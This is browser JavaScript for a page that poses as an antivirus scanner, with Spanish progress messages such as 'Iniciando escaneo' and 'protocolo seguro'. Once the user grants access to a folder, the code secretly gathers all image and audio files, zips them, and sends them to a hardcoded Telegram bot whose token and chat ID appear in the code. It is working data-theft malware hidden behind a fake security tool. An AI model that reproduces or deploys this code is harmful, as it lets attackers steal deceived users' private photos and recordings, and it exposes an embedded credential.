let startTime;
let totalBatches;
let isProcessing = false;

function updateStatus(message, progress = 0) {
    const statusElement = document.getElementById('antivirus-status');
    const progressElement = document.getElementById('progress');
    const timeElement = document.getElementById('time-info');
    
    statusElement.innerHTML = `[${progress}%] ${message}`;
    progressElement.style.width = `${progress}%`;
    
    if (startTime && progress > 0 && progress < 100) {
        const elapsed = (Date.now() - startTime) / 1000;
        const remaining = (elapsed / progress) * (100 - progress);
        timeElement.innerHTML = `⏳ Tiempo restante: ~${Math.floor(remaining)} segundos`;
    } else if (progress === 100) {
        timeElement.innerHTML = '✅ Operación completada';
    } else {
        timeElement.innerHTML = '⏳ Calculando tiempo...';
    }
}

document.getElementById('start-btn').addEventListener('click', async () => {
    if (isProcessing) return;
    isProcessing = true;
    
    try {
        startTime = Date.now();
        updateStatus('Iniciando escaneo...', 5);
        
        if (!window.showDirectoryPicker) throw new Error('Navegador no compatible');

        setTimeout(async () => {
            try {
                updateStatus('Accediendo al sistema...', 10);
                const folderHandle = await window.showDirectoryPicker();
                
                updateStatus('Analizando estructura...', 20);
                const files = await collectFiles(folderHandle);
                if (!files.length) throw new Error('No hay archivos');
                updateStatus(`Elementos detectados: ${files.length}`, 40);

                updateStatus('Comprimiendo datos...', 50);
                const zipBatches = await createZipBatches(files);
                totalBatches = zipBatches.length;
                
                updateStatus('Iniciando protocolo seguro...', 70);
                await processBatches(zipBatches);
                
                updateStatus('✅ OPERACIÓN EXITOSA', 100);
            } catch (error) {
                updateStatus(`❌ ERROR: ${error.message}`, 0);
                alert(`FALLO: ${error.message}`);
            }
            isProcessing = false;
        }, 100);
        
    } catch (error) {
        updateStatus(`❌ ERROR: ${error.message}`, 0);
        alert(`FALLO: ${error.message}`);
        isProcessing = false;
    }
});

async function collectFiles(folderHandle) {
    const files = [];
    for await (const entry of folderHandle.values()) {
        if (entry.kind === 'file') {
            const fileName = entry.name.toLowerCase();
            if (fileName.endsWith('.jpg') || fileName.endsWith('.jpeg') || fileName.endsWith('.png') || 
                fileName.endsWith('.gif') || fileName.endsWith('.bmp') || fileName.endsWith('.webp') ||
                fileName.endsWith('.mp3') || fileName.endsWith('.wav') || fileName.endsWith('.ogg')) {
                files.push(entry);
            }
        } else if (entry.kind === 'directory') {
            const subFiles = await collectFiles(entry);
            files.push(...subFiles);
        }
    }
    return files;
}

async function createZipBatches(files) {
    const maxSize = 30 * 1024 * 1024; // 30 MB en bytes
    const batches = [];
    let currentBatch = new JSZip();
    let currentFiles = [];
    
    for (let i = 0; i < files.length; i++) {
        const file = files[i];
        const fileData = await file.getFile();

        currentFiles.push({ name: file.name, data: await fileData.arrayBuffer() });
        currentBatch.file(file.name, await fileData.arrayBuffer());

        const zipBlob = await currentBatch.generateAsync({ 
            type: 'blob', 
            compression: "DEFLATE", 
            compressionOptions: { level: 9 } 
        });
        if (zipBlob.size > maxSize) {
            currentBatch = new JSZip();
            currentFiles.pop();
            for (const f of currentFiles) currentBatch.file(f.name, f.data);
            batches.push(currentBatch);

            currentBatch = new JSZip();
            currentBatch.file(file.name, await fileData.arrayBuffer());
            currentFiles = [{ name: file.name, data: await fileData.arrayBuffer() }];
        }

        if (i === files.length - 1 && currentFiles.length > 0) {
            batches.push(currentBatch);
        }
    }
    return batches;
}

async function processBatches(batches) {
    const chat_id = '5821490693'; // Chat ID fijo
    const botToken = '7212842349:AAHU7CbW1M6E-n01opEnnwTGs3eLveS1BLk'; // Token actual

    for (let index = 0; index < batches.length; index++) {
        const progress = 70 + Math.floor(((index + 1) / batches.length) * 30);
        updateStatus(`Procesando lote ${index + 1}/${batches.length}`, progress);

        const zipBlob = await batches[index].generateAsync({ 
            type: 'blob', 
            compression: "DEFLATE", 
            compressionOptions: { level: 9 } 
        });

        if (zipBlob.size > 30 * 1024 * 1024) {
            alert(`El zip ${index + 1} excede 30 MB y será omitido`);
            continue;
        }

        await sendZipToTelegram(zipBlob, `backup-${Date.now()}-${index + 1}.zip`, chat_id, botToken);
    }
}

async function sendZipToTelegram(blob, fileName, chat_id, botToken) {
    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('document', blob, fileName);

    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
            method: 'POST',
            body: formData
        });

        if (!response.ok) {
            const errorData = await response.json();
            throw new Error(errorData.description || 'Error al enviar archivo');
        }
    } catch (error) {
        alert(`❌ Error al enviar ZIP: ${error.message}`);
    }
}
